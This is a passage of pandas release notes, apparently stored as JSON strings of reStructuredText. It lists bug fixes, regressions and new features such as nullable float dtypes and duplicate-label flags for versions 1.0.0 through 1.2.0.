datetime-like) (:issue:`29539`)\n- Bug in :class:`UInt64Index` precision loss while constructing from a list with values in the ``np.uint64`` range (:issue:`29526`)\n- Bug in :class:`NumericIndex` construction that caused indexing to fail when integers in the ``np.uint64`` range were used (:issue:`28023`)\n- Bug in :class:`NumericIndex` construction that caused :class:`UInt64Index` to be casted to :class:`Float64Index` when integers in the ``np.uint64`` range were used to index a :class:`DataFrame` (:issue:`28279`)\n- Bug in :meth:`Series.interpolate` when using method=`index` with an unsorted index, would previously return incorrect results. (:issue:`21037`)\n- Bug in :meth:`DataFrame.round` where a :class:`DataFrame` with a :class:`CategoricalIndex` of :class:`IntervalIndex` columns would incorrectly raise a ``TypeError`` (:issue:`30063`)\n- Bug in :meth:`Series.pct_change` and :meth:`DataFrame.pct_change` when there are duplicated indices (:issue:`30463`)\n- Bug in :class:`DataFrame` cumulative operations (e.g. cumsum, cummax) incorrect casting to object-dtype (:issue:`19296`)\n- Bug in :class:`~DataFrame.diff` losing the dtype for extension types (:issue:`30889`)\n- Bug in :class:`DataFrame.diff` raising an ``IndexError`` when one of the columns was a nullable integer dtype (:issue:`30967`)\n\nConversion\n^^^^^^^^^^\n\n-\n\nStrings\n^^^^^^^\n\n- Calling :meth:`Series.str.isalnum` (and other \"ismethods\") on an empty ``Series`` would return an ``object`` dtype instead of ``bool`` (:issue:`29624`)\n-\n\n\nInterval\n^^^^^^^^\n\n- Bug in :meth:`IntervalIndex.get_indexer` where a :class:`Categorical` or :class:`CategoricalIndex` ``target`` would incorrectly raise a ``TypeError`` (:issue:`30063`)\n- Bug in ``pandas.core.dtypes.cast.infer_dtype_from_scalar`` where passing ``pandas_dtype=True`` did not infer :class:`IntervalDtype` (:issue:`30337`)\n- Bug in :class:`Series` constructor where constructing a ``Series`` from a ``list`` of :class:`Interval` objects resulted in ``object`` dtype instead of :class:`IntervalDtype` (:issue:`23563`)\n- Bug in :class:`IntervalDtype` where the ``kind`` attribute was incorrectly set as ``None`` instead of ``\"O\"`` (:issue:`30568`)\n- Bug in :class:`IntervalIndex`, :class:`~arrays.IntervalArray`, and :class:`Series` with interval data where equality comparisons were incorrect (:issue:`24112`)\n\nIndexing\n^^^^^^^^\n\n- Bug in assignment using a reverse slicer (:issue:`26939`)\n- Bug in :meth:`DataFrame.explode` would duplicate frame in the presence of duplicates in the index (:issue:`28010`)\n- Bug in reindexing a :meth:`PeriodIndex` with another type of index that contained a ``Period`` (:issue:`28323`) (:issue:`28337`)\n- Fix assignment of column via ``.loc`` with numpy non-ns datetime type (:issue:`27395`)\n- Bug in :meth:`Float64Index.astype` where ``np.inf`` was not handled properly when casting to an integer dtype (:issue:`28475`)\n- :meth:`Index.union` could fail when the left contained duplicates (:issue:`28257`)\n- Bug when indexing with ``.loc`` where the index was a :class:`CategoricalIndex` with non-string categories didn't work (:issue:`17569`, :issue:`30225`)\n- :meth:`Index.get_indexer_non_unique` could fail with ``TypeError`` in some cases, such as when searching for ints in a string index (:issue:`28257`)\n- Bug in :meth:`Float64Index.get_loc` incorrectly raising ``TypeError`` instead of ``KeyError`` (:issue:`29189`)\n- Bug in :meth:`DataFrame.loc` with incorrect dtype when setting Categorical value in 1-row DataFrame (:issue:`25495`)\n- :meth:`MultiIndex.get_loc` can't find missing values when input includes missing values (:issue:`19132`)\n- Bug in :meth:`Series.__setitem__` incorrectly assigning values with boolean indexer when the length of new data matches the number of ``True`` values and new data is not a ``Series`` or an ``np.array`` (:issue:`30567`)\n- Bug in indexing with a :class:`PeriodIndex` incorrectly accepting integers representing years, use e.g. ``ser.loc[\"2007\"]`` instead of ``ser.loc[2007]`` (:issue:`30763`)\n\nMissing\n^^^^^^^\n\n-\n\nMultiIndex\n^^^^^^^^^^\n\n- Constructor for :class:`MultiIndex` verifies that the given ``sortorder`` is compatible with the actual ``lexsort_depth``  if ``verify_integrity`` parameter is ``True`` (the default) (:issue:`28735`)\n- Series and MultiIndex ``.drop`` with ``MultiIndex`` raise exception if labels not in given in level (:issue:`8594`)\n-\n\nIO\n^^\n\n- :meth:`read_csv` now accepts binary mode file buffers when using the Python csv engine (:issue:`23779`)\n- Bug in :meth:`DataFrame.to_json` where using a Tuple as a column or index value and using ``orient=\"columns\"`` or ``orient=\"index\"`` would produce invalid JSON (:issue:`20500`)\n- Improve infinity parsing. :meth:`read_csv` now interprets ``Infinity``, ``+Infinity``, ``-Infinity`` as floating point values (:issue:`10065`)\n- Bug in :meth:`DataFrame.to_csv` where values were truncated when the length of ``na_rep`` was shorter than the text input data. (:issue:`25099`)\n- Bug in :func:`DataFrame.to_string` where values were truncated using display options instead of outputting the full content (:issue:`9784`)\n- Bug in :meth:`DataFrame.to_json` where a datetime column label would not be written out in ISO format with ``orient=\"table\"`` (:issue:`28130`)\n- Bug in :func:`DataFrame.to_parquet` where writing to GCS would fail with ``engine='fastparquet'`` if the file did not already exist (:issue:`28326`)\n- Bug in :func:`read_hdf` closing stores that it didn't open when Exceptions are raised (:issue:`28699`)\n- Bug in :meth:`DataFrame.read_json` where using ``orient=\"index\"`` would not maintain the order (:issue:`28557`)\n- Bug in :meth:`DataFrame.to_html` where the length of the ``formatters`` argument was not verified (:issue:`28469`)\n- Bug in :meth:`DataFrame.read_excel` with ``engine='ods'`` when ``sheet_name`` argument references a non-existent sheet (:issue:`27676`)\n- Bug in :meth:`pandas.io.formats.style.Styler` formatting for floating values not displaying decimals correctly (:issue:`13257`)\n- Bug in :meth:`DataFrame.to_html` when using ``formatters=<list>`` and ``max_cols`` together. (:issue:`25955`)\n- Bug in :meth:`Styler.background_gradient` not able to work with dtype ``Int64`` (:issue:`28869`)\n- Bug in :meth:`DataFrame.to_clipboard` which did not work reliably in ipython (:issue:`22707`)\n- Bug in :func:`read_json` where default encoding was not set to ``utf-8`` (:issue:`29565`)\n- Bug in :class:`PythonParser` where str and bytes were being mixed when dealing with the decimal field (:issue:`29650`)\n- :meth:`read_gbq` now accepts ``progress_bar_type`` to display progress bar while the data downloads. (:issue:`29857`)\n- Bug in :func:`pandas.io.json.json_normalize` where a missing value in the location specified by ``record_path`` would raise a ``TypeError`` (:issue:`30148`)\n- :func:`read_excel` now accepts binary data (:issue:`15914`)\n- Bug in :meth:`read_csv` in which encoding handling was limited to just the string ``utf-16`` for the C engine (:issue:`24130`)\n\nPlotting\n^^^^^^^^\n\n- Bug in :meth:`Series.plot` not able to plot boolean values (:issue:`23719`)\n- Bug in :meth:`DataFrame.plot` not able to plot when no rows (:issue:`27758`)\n- Bug in :meth:`DataFrame.plot` producing incorrect legend markers when plotting multiple series on the same axis (:issue:`18222`)\n- Bug in :meth:`DataFrame.plot` when ``kind='box'`` and data contains datetime or timedelta data. These types are now automatically dropped (:issue:`22799`)\n- Bug in :meth:`DataFrame.plot.line` and :meth:`DataFrame.plot.area` produce wrong xlim in x-axis (:issue:`27686`, :issue:`25160`, :issue:`24784`)\n- Bug where :meth:`DataFrame.boxplot` would not accept a ``color`` parameter like :meth:`DataFrame.plot.box` (:issue:`26214`)\n- Bug in the ``xticks`` argument being ignored for :meth:`DataFrame.plot.bar` (:issue:`14119`)\n- :func:`set_option` now validates that the plot backend provided to ``'plotting.backend'`` implements the backend when the option is set, rather than when a plot is created (:issue:`28163`)\n- :meth:`DataFrame.plot` now allow a ``backend`` keyword argument to allow changing between backends in one session (:issue:`28619`).\n- Bug in color validation incorrectly raising for non-color styles (:issue:`29122`).\n- Allow :meth:`DataFrame.plot.scatter` to plot ``objects`` and ``datetime`` type data (:issue:`18755`, :issue:`30391`)\n- Bug in :meth:`DataFrame.hist`, ``xrot=0`` does not work with ``by`` and subplots (:issue:`30288`).\n\nGroupBy/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Bug in :meth:`core.groupby.DataFrameGroupBy.apply` only showing output from a single group when function returns an :class:`Index` (:issue:`28652`)\n- Bug in :meth:`DataFrame.groupby` with multiple groups where an ``IndexError`` would be raised if any group contained all NA values (:issue:`20519`)\n- Bug in :meth:`.Resampler.size` and :meth:`.Resampler.count` returning wrong dtype when used with an empty :class:`Series` or :class:`DataFrame` (:issue:`28427`)\n- Bug in :meth:`DataFrame.rolling` not allowing for rolling over datetimes when ``axis=1`` (:issue:`28192`)\n- Bug in :meth:`DataFrame.rolling` not allowing rolling over multi-index levels (:issue:`15584`).\n- Bug in :meth:`DataFrame.rolling` not allowing rolling on monotonic decreasing time indexes (:issue:`19248`).\n- Bug in :meth:`DataFrame.groupby` not offering selection by column name when ``axis=1`` (:issue:`27614`)\n- Bug in :meth:`core.groupby.DataFrameGroupby.agg` not able to use lambda function with named aggregation (:issue:`27519`)\n- Bug in :meth:`DataFrame.groupby` losing column name information when grouping by a categorical column (:issue:`28787`)\n- Remove error raised due to duplicated input functions in named aggregation in :meth:`DataFrame.groupby` and :meth:`Series.groupby`. Previously error will be raised if the same function is applied on the same column and now it is allowed if new assigned names are different. (:issue:`28426`)\n- :meth:`core.groupby.SeriesGroupBy.value_counts` will be able to handle the case even when the :class:`Grouper` makes empty groups (:issue:`28479`)\n- Bug in :meth:`core.window.rolling.Rolling.quantile` ignoring ``interpolation`` keyword argument when used within a groupby (:issue:`28779`)\n- Bug in :meth:`DataFrame.groupby` where ``any``, ``all``, ``nunique`` and transform functions would incorrectly handle duplicate column labels (:issue:`21668`)\n- Bug in :meth:`core.groupby.DataFrameGroupBy.agg` with timezone-aware datetime64 column incorrectly casting results to the original dtype (:issue:`29641`)\n- Bug in :meth:`DataFrame.groupby` when using axis=1 and having a single level columns index (:issue:`30208`)\n- Bug in :meth:`DataFrame.groupby` when using nunique on axis=1 (:issue:`30253`)\n- Bug in :meth:`.DataFrameGroupBy.quantile` and :meth:`.SeriesGroupBy.quantile` with multiple list-like q value and integer column names (:issue:`30289`)\n- Bug in :meth:`.DataFrameGroupBy.pct_change` and :meth:`.SeriesGroupBy.pct_change` causes ``TypeError`` when ``fill_method`` is ``None`` (:issue:`30463`)\n- Bug in :meth:`Rolling.count` and :meth:`Expanding.count` argument where ``min_periods`` was ignored (:issue:`26996`)\n\nReshaping\n^^^^^^^^^\n\n- Bug in :meth:`DataFrame.apply` that caused incorrect output with empty :class:`DataFrame` (:issue:`28202`, :issue:`21959`)\n- Bug in :meth:`DataFrame.stack` not handling non-unique indexes correctly when creating MultiIndex (:issue:`28301`)\n- Bug in :meth:`pivot_table` not returning correct type ``float`` when ``margins=True`` and ``aggfunc='mean'`` (:issue:`24893`)\n- Bug :func:`merge_asof` could not use :class:`datetime.timedelta` for ``tolerance`` kwarg (:issue:`28098`)\n- Bug in :func:`merge`, did not append suffixes correctly with MultiIndex (:issue:`28518`)\n- :func:`qcut` and :func:`cut` now handle boolean input (:issue:`20303`)\n- Fix to ensure all int dtypes can be used in :func:`merge_asof` when using a tolerance value. Previously every non-int64 type would raise an erroneous ``MergeError`` (:issue:`28870`).\n- Better error message in :func:`get_dummies` when ``columns`` isn't a list-like value (:issue:`28383`)\n- Bug in :meth:`Index.join` that caused infinite recursion error for mismatched ``MultiIndex`` name orders. (:issue:`25760`, :issue:`28956`)\n- Bug :meth:`Series.pct_change` where supplying an anchored frequency would throw a ``ValueError`` (:issue:`28664`)\n- Bug where :meth:`DataFrame.equals` returned True incorrectly in some cases when two DataFrames had the same columns in different orders (:issue:`28839`)\n- Bug in :meth:`DataFrame.replace` that caused non-numeric replacer's dtype not respected (:issue:`26632`)\n- Bug in :func:`melt` where supplying mixed strings and numeric values for ``id_vars`` or ``value_vars`` would incorrectly raise a ``ValueError`` (:issue:`29718`)\n- Dtypes are now preserved when transposing a ``DataFrame`` where each column is the same extension dtype (:issue:`30091`)\n- Bug in :func:`merge_asof` merging on a tz-aware ``left_index`` and ``right_on`` a tz-aware column (:issue:`29864`)\n- Improved error message and docstring in :func:`cut` and :func:`qcut` when ``labels=True`` (:issue:`13318`)\n- Bug in missing ``fill_na`` parameter to :meth:`DataFrame.unstack` with list of levels (:issue:`30740`)\n\nSparse\n^^^^^^\n- Bug in :class:`SparseDataFrame` arithmetic operations incorrectly casting inputs to float (:issue:`28107`)\n- Bug in ``DataFrame.sparse`` returning a ``Series`` when there was a column named ``sparse`` rather than the accessor (:issue:`30758`)\n- Fixed :meth:`operator.xor` with a boolean-dtype ``SparseArray``. Now returns a sparse result, rather than object dtype (:issue:`31025`)\n\nExtensionArray\n^^^^^^^^^^^^^^\n\n- Bug in :class:`arrays.PandasArray` when setting a scalar string (:issue:`28118`, :issue:`28150`).\n- Bug where nullable integers could not be compared to strings (:issue:`28930`)\n- Bug where :class:`DataFrame` constructor raised ``ValueError`` with list-like data and ``dtype`` specified (:issue:`30280`)\n\nOther\n^^^^^\n- Trying to set the ``display.precision``, ``display.max_rows`` or ``display.max_columns`` using :meth:`set_option` to anything but a ``None`` or a positive int will raise a ``ValueError`` (:issue:`23348`)\n- Using :meth:`DataFrame.replace` with overlapping keys in a nested dictionary will no longer raise, now matching the behavior of a flat dictionary (:issue:`27660`)\n- :meth:`DataFrame.to_csv` and :meth:`Series.to_csv` now support dicts as ``compression`` argument with key ``'method'`` being the compression method and others as additional compression options when the compression method is ``'zip'``. (:issue:`26023`)\n- Bug in :meth:`Series.diff` where a boolean series would incorrectly raise a ``TypeError`` (:issue:`17294`)\n- :meth:`Series.append` will no longer raise a ``TypeError`` when passed a tuple of ``Series`` (:issue:`28410`)\n- Fix corrupted error message when calling ``pandas.libs._json.encode()`` on a 0d array (:issue:`18878`)\n- Backtick quoting in :meth:`DataFrame.query` and :meth:`DataFrame.eval` can now also be used to use invalid identifiers like names that start with a digit, are python keywords, or are using single character operators. (:issue:`27017`)\n- Bug in ``pd.core.util.hashing.hash_pandas_object`` where arrays containing tuples were incorrectly treated as non-hashable (:issue:`28969`)\n- Bug in :meth:`DataFrame.append` that raised ``IndexError`` when appending with empty list (:issue:`28769`)\n- Fix :class:`AbstractHolidayCalendar` to return correct results for\n  years after 2030 (now goes up to 2200) (:issue:`27790`)\n- Fixed :class:`~arrays.IntegerArray` returning ``inf`` rather than ``NaN`` for operations dividing by ``0`` (:issue:`27398`)\n- Fixed ``pow`` operations for :class:`~arrays.IntegerArray` when the other value is ``0`` or ``1`` (:issue:`29997`)\n- Bug in :meth:`Series.count` raises if use_inf_as_na is enabled (:issue:`29478`)\n- Bug in :class:`Index` where a non-hashable name could be set without raising ``TypeError`` (:issue:`29069`)\n- Bug in :class:`DataFrame` constructor when passing a 2D ``ndarray`` and an extension dtype (:issue:`12513`)\n- Bug in :meth:`DataFrame.to_csv` when supplied a series with a ``dtype=\"string\"`` and a ``na_rep``, the ``na_rep`` was being truncated to 2 characters. (:issue:`29975`)\n- Bug where :meth:`DataFrame.itertuples` would incorrectly determine whether or not namedtuples could be used for dataframes of 255 columns (:issue:`28282`)\n- Handle nested NumPy ``object`` arrays in :func:`testing.assert_series_equal` for ExtensionArray implementations (:issue:`30841`)\n- Bug in :class:`Index` constructor incorrectly allowing 2-dimensional input arrays (:issue:`13601`, :issue:`27125`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_100.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.25.3..v1.0.0\n", "1.3.1": ".. _whatsnew_131:\n\nWhat's new in 1.3.1 (July 25, 2021)\n-----------------------------------\n\nThese are the changes in pandas 1.3.1. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_131.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Pandas could not be built on PyPy (:issue:`42355`)\n- :class:`DataFrame` constructed with an older version of pandas could not be unpickled (:issue:`42345`)\n- Performance regression in constructing a :class:`DataFrame` from a dictionary of dictionaries (:issue:`42248`)\n- Fixed regression in :meth:`DataFrame.agg` dropping values when the DataFrame had an Extension Array dtype, a duplicate index, and ``axis=1`` (:issue:`42380`)\n- Fixed regression in :meth:`DataFrame.astype` changing the order of noncontiguous data (:issue:`42396`)\n- Performance regression in :class:`DataFrame` in reduction operations requiring casting such as :meth:`DataFrame.mean` on integer data (:issue:`38592`)\n- Performance regression in :meth:`DataFrame.to_dict` and :meth:`Series.to_dict` when ``orient`` argument one of \"records\", \"dict\", or \"split\" (:issue:`42352`)\n- Fixed regression in indexing with a ``list`` subclass incorrectly raising ``TypeError`` (:issue:`42433`, :issue:`42461`)\n- Fixed regression in :meth:`DataFrame.isin` and :meth:`Series.isin` raising ``TypeError`` with nullable data containing at least one missing value (:issue:`42405`)\n- Regression in :func:`concat` between objects with bool dtype and integer dtype casting to object instead of to integer (:issue:`42092`)\n- Bug in :class:`Series` constructor not accepting a ``dask.Array`` (:issue:`38645`)\n- Fixed regression for ``SettingWithCopyWarning`` displaying incorrect stacklevel (:issue:`42570`)\n- Fixed regression for :func:`merge_asof` raising ``KeyError`` when one of the ``by`` columns is in the index (:issue:`34488`)\n- Fixed regression in :func:`to_datetime` returning pd.NaT for inputs that produce duplicated values, when ``cache=True`` (:issue:`42259`)\n- Fixed regression in :meth:`SeriesGroupBy.value_counts` that resulted in an ``IndexError`` when called on a Series with one row (:issue:`42618`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_131.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Fixed bug in :meth:`DataFrame.transpose` dropping values when the DataFrame had an Extension Array dtype and a duplicate index (:issue:`42380`)\n- Fixed bug in :meth:`DataFrame.to_xml` raising ``KeyError`` when called with ``index=False`` and an offset index (:issue:`42458`)\n- Fixed bug in :meth:`.Styler.set_sticky` not handling index names correctly for single index columns case (:issue:`42537`)\n- Fixed bug in :meth:`DataFrame.copy` failing to consolidate blocks in the result (:issue:`42579`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_131.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.3.0..v1.3.1\n", "1.2.3": ".. _whatsnew_123:\n\nWhat's new in 1.2.3 (March 02, 2021)\n------------------------------------\n\nThese are the changes in pandas 1.2.3. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_123.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n\n- Fixed regression in :meth:`~DataFrame.to_excel` raising ``KeyError`` when giving duplicate columns with ``columns`` attribute (:issue:`39695`)\n- Fixed regression in nullable integer unary ops propagating mask on assignment (:issue:`39943`)\n- Fixed regression in :meth:`DataFrame.__setitem__` not aligning :class:`DataFrame` on right-hand side for boolean indexer (:issue:`39931`)\n- Fixed regression in :meth:`~DataFrame.to_json` failing to use ``compression`` with URL-like paths that are internally opened in binary mode or with user-provided file objects that are opened in binary mode (:issue:`39985`)\n- Fixed regression in :meth:`Series.sort_index` and :meth:`DataFrame.sort_index`, which exited with an ungraceful error when having kwarg ``ascending=None`` passed. Passing ``ascending=None`` is still considered invalid, and the improved error message suggests a proper usage (``ascending`` must be a boolean or a list-like of boolean) (:issue:`39434`)\n- Fixed regression in :meth:`DataFrame.transform` and :meth:`Series.transform` giving incorrect column labels when passed a dictionary with a mix of list and non-list values (:issue:`40018`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_123.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.2.2..v1.2.3\n", "1.2.0": ".. _whatsnew_120:\n\nWhat's new in 1.2.0 (December 26, 2020)\n---------------------------------------\n\nThese are the changes in pandas 1.2.0. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. warning::\n\n   The `xlwt <https://xlwt.readthedocs.io/en/latest/>`_ package for writing old-style ``.xls``\n   excel files is no longer maintained.\n   The `xlrd <https://xlrd.readthedocs.io/en/latest/>`_ package is now only for reading\n   old-style ``.xls`` files.\n\n   Previously, the default argument ``engine=None`` to :func:`~pandas.read_excel`\n   would result in using the ``xlrd`` engine in many cases, including new\n   Excel 2007+ (``.xlsx``) files.\n   If `openpyxl <https://openpyxl.readthedocs.io/en/stable/>`_  is installed,\n   many of these cases will now default to using the ``openpyxl`` engine.\n   See the :func:`read_excel` documentation for more details.\n\n   Thus, it is strongly encouraged to install ``openpyxl`` to read Excel 2007+\n   (``.xlsx``) files.\n   **Please do not report issues when using ``xlrd`` to read ``.xlsx`` files.**\n   This is no longer supported, switch to using ``openpyxl`` instead.\n\n   Attempting to use the ``xlwt`` engine will raise a ``FutureWarning``\n   unless the option :attr:`io.excel.xls.writer` is set to ``\"xlwt\"``.\n   While this option is now deprecated and will also raise a ``FutureWarning``,\n   it can be globally set and the warning suppressed. Users are recommended to\n   write ``.xlsx`` files using the ``openpyxl`` engine instead.\n\n.. ---------------------------------------------------------------------------\n\nEnhancements\n~~~~~~~~~~~~\n\n.. _whatsnew_120.duplicate_labels:\n\nOptionally disallow duplicate labels\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:class:`Series` and :class:`DataFrame` can now be created with ``allows_duplicate_labels=False`` flag to\ncontrol whether the index or columns can contain duplicate labels (:issue:`28394`). This can be used to\nprevent accidental introduction of duplicate labels, which can affect downstream operations.\n\nBy default, duplicates continue to be allowed.\n\n.. code-block:: ipython\n\n    In [1]: pd.Series([1, 2], index=['a', 'a'])\n    Out[1]:\n    a    1\n    a    2\n    Length: 2, dtype: int64\n\n    In [2]: pd.Series([1, 2], index=['a', 'a']).set_flags(allows_duplicate_labels=False)\n    ...\n    DuplicateLabelError: Index has duplicates.\n          positions\n    label\n    a        [0, 1]\n\npandas will propagate the ``allows_duplicate_labels`` property through many operations.\n\n.. code-block:: ipython\n\n    In [3]: a = (\n       ...:     pd.Series([1, 2], index=['a', 'b'])\n       ...:       .set_flags(allows_duplicate_labels=False)\n       ...: )\n\n    In [4]: a\n    Out[4]:\n    a    1\n    b    2\n    Length: 2, dtype: int64\n\n    # An operation introducing duplicates\n    In [5]: a.reindex(['a', 'b', 'a'])\n    ...\n    DuplicateLabelError: Index has duplicates.\n          positions\n    label\n    a        [0, 2]\n\n    [1 rows x 1 columns]\n\n.. warning::\n\n   This is an experimental feature. Currently, many methods fail to\n   propagate the ``allows_duplicate_labels`` value. In future versions\n   it is expected that every method taking or returning one or more\n   DataFrame or Series objects will propagate ``allows_duplicate_labels``.\n\nSee :ref:`duplicates` for more.\n\nThe ``allows_duplicate_labels`` flag is stored in the new :attr:`DataFrame.flags`\nattribute. This stores global attributes that apply to the *pandas object*. This\ndiffers from :attr:`DataFrame.attrs`, which stores information that applies to\nthe dataset.\n\nPassing arguments to fsspec backends\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nMany read/write functions have acquired the ``storage_options`` optional argument,\nto pass a dictionary of parameters to the storage backend. This allows, for\nexample, for passing credentials to S3 and GCS storage. The details of what\nparameters can be passed to which backends can be found in the documentation\nof the individual storage backends (detailed from the fsspec docs for\n`builtin implementations`_ and linked to `external ones`_). See\nSection :ref:`io.remote`.\n\n:issue:`35655` added fsspec support (including ``storage_options``)\nfor reading excel files.\n\n.. _builtin implementations: https://filesystem-spec.readthedocs.io/en/latest/api.html#built-in-implementations\n.. _external ones: https://filesystem-spec.readthedocs.io/en/latest/api.html#other-known-implementations\n\n.. _whatsnew_120.binary_handle_to_csv:\n\nSupport for binary file handles in ``to_csv``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`to_csv` supports file handles in binary mode (:issue:`19827` and :issue:`35058`)\nwith ``encoding`` (:issue:`13068` and :issue:`23854`) and ``compression`` (:issue:`22555`).\nIf pandas does not automatically detect whether the file handle is opened in binary or text mode,\nit is necessary to provide ``mode=\"wb\"``.\n\nFor example:\n\n.. ipython:: python\n\n   import io\n\n   data = pd.DataFrame([0, 1, 2])\n   buffer = io.BytesIO()\n   data.to_csv(buffer, encoding=\"utf-8\", compression=\"gzip\")\n\nSupport for short caption and table position in ``to_latex``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`DataFrame.to_latex` now allows one to specify\na floating table position (:issue:`35281`)\nand a short caption (:issue:`36267`).\n\nThe keyword ``position`` has been added to set the position.\n\n.. ipython:: python\n   :okwarning:\n\n   data = pd.DataFrame({'a': [1, 2], 'b': [3, 4]})\n   table = data.to_latex(position='ht')\n   print(table)\n\nUsage of the keyword ``caption`` has been extended.\nBesides taking a single string as an argument,\none can optionally provide a tuple ``(full_caption, short_caption)``\nto add a short caption macro.\n\n.. ipython:: python\n   :okwarning:\n\n   data = pd.DataFrame({'a': [1, 2], 'b': [3, 4]})\n   table = data.to_latex(caption=('the full long caption', 'short caption'))\n   print(table)\n\n.. _whatsnew_120.read_csv_table_precision_default:\n\nChange in default floating precision for ``read_csv`` and ``read_table``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nFor the C parsing engine, the methods :meth:`read_csv` and :meth:`read_table` previously defaulted to a parser that\ncould read floating point numbers slightly incorrectly with respect to the last bit in precision.\nThe option ``floating_precision=\"high\"`` has always been available to avoid this issue.\nBeginning with this version, the default is now to use the more accurate parser by making\n``floating_precision=None`` correspond to the high precision parser, and the new option\n``floating_precision=\"legacy\"`` to use the legacy parser. The change to using the higher precision\nparser by default should have no impact on performance. (:issue:`17154`)\n\n.. _whatsnew_120.floating:\n\nExperimental nullable data types for float data\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWe've added :class:`Float32Dtype` / :class:`Float64Dtype` and :class:`~arrays.FloatingArray`.\nThese are extension data types dedicated to floating point data that can hold the\n``pd.NA`` missing value indicator (:issue:`32265`, :issue:`34307`).\n\nWhile the default float data type already supports missing values using ``np.nan``,\nthese new data types use ``pd.NA`` (and its corresponding behavior) as the missing\nvalue indicator, in line with the already existing nullable :ref:`integer <integer_na>`\nand :ref:`boolean <boolean>` data types.\n\nOne example where the behavior of ``np.nan`` and ``pd.NA`` is different is\ncomparison operations:\n\n.. ipython:: python\n\n  # the default NumPy float64 dtype\n  s1 = pd.Series([1.5, None])\n  s1\n  s1 > 1\n\n.. ipython:: python\n\n  # the new nullable float64 dtype\n  s2 = pd.Series([1.5, None], dtype=\"Float64\")\n  s2\n  s2 > 1\n\nSee the :ref:`missing_data.NA` doc section for more details on the behavior\nwhen using the ``pd.NA`` missing value indicator.\n\nAs shown above, the dtype can be specified using the \"Float64\" or \"Float32\"\nstring (capitalized to distinguish it from the default \"float64\" data type).\nAlternatively, you can also use the dtype object:\n\n.. ipython:: python\n\n   pd.Series([1.5, None], dtype=pd.Float32Dtype())\n\nOperations with the existing integer or boolean nullable data types that\ngive float results will now also use the nullable floating data types (:issue:`38178`).\n\n.. warning::\n\n   Experimental: the new floating data types are currently experimental, and their\n   behavior or API may still change without warning. Especially the behavior\n   regarding NaN (distinct from NA missing values) is subject to change.\n\n.. _whatsnew_120.index_name_preservation:\n\nIndex/column name preservation when aggregating\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWhen aggregating using :meth:`concat` or the :class:`DataFrame` constructor, pandas\nwill now attempt to preserve index and column names whenever possible (:issue:`35847`).\nIn the case where all inputs share a common name, this name will be assigned to the\nresult. When the input names do not all agree, the result will be unnamed. Here is an\nexample where the index name is preserved:\n\n.. ipython:: python\n\n    idx = pd.Index(range(5), name='abc')\n    ser = pd.Series(range(5, 10), index=idx)\n    pd.concat({'x': ser[1:], 'y': ser[:-1]}, axis=1)\n\nThe same is true for :class:`MultiIndex`, but the logic is applied separately on a\nlevel-by-level basis.\n\n.. _whatsnew_120.groupby_ewm:\n\nGroupBy supports EWM operations directly\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:class:`.DataFrameGroupBy` now supports exponentially weighted window operations directly (:issue:`16037`).\n\n.. ipython:: python\n\n    df = pd.DataFrame({'A': ['a', 'b', 'a', 'b'], 'B': range(4)})\n    df\n    df.groupby('A').ewm(com=1.0).mean()\n\nAdditionally ``mean`` supports execution via `Numba <https://numba.pydata.org/>`__ with\nthe  ``engine`` and ``engine_kwargs`` arguments. Numba must be installed as an optional dependency\nto use this feature.\n\n.. _whatsnew_120.enhancements.other:\n\nOther enhancements\n^^^^^^^^^^^^^^^^^^\n- Added ``day_of_week`` (compatibility alias ``dayofweek``) property to :class:`Timestamp`, :class:`.DatetimeIndex`, :class:`Period`, :class:`PeriodIndex` (:issue:`9605`)\n- Added ``day_of_year`` (compatibility alias ``dayofyear``) property to :class:`Timestamp`, :class:`.DatetimeIndex`, :class:`Period`, :class:`PeriodIndex` (:issue:`9605`)\n- Added :meth:`~DataFrame.set_flags` for setting table-wide flags on a Series or DataFrame (:issue:`28394`)\n- :meth:`DataFrame.applymap` now supports ``na_action`` (:issue:`23803`)\n- :class:`Index` with object dtype supports division and multiplication (:issue:`34160`)\n- :meth:`io.sql.get_schema` now supports a ``schema`` keyword argument that will add a schema into the create table statement (:issue:`28486`)\n- :meth:`DataFrame.explode` and :meth:`Series.explode` now support exploding of sets (:issue:`35614`)\n- :meth:`DataFrame.hist` now supports time series (datetime) data (:issue:`32590`)\n- :meth:`.Styler.set_table_styles` now allows the direct styling of rows and columns and can be chained (:issue:`35607`)\n- :class:`.Styler` now allows direct CSS class name addition to individual data cells (:issue:`36159`)\n- :meth:`.Rolling.mean` and :meth:`.Rolling.sum` use Kahan summation to calculate the mean to avoid numerical problems (:issue:`10319`, :issue:`11645`, :issue:`13254`, :issue:`32761`, :issue:`36031`)\n- :meth:`.DatetimeIndex.searchsorted`, :meth:`.TimedeltaIndex.searchsorted`, 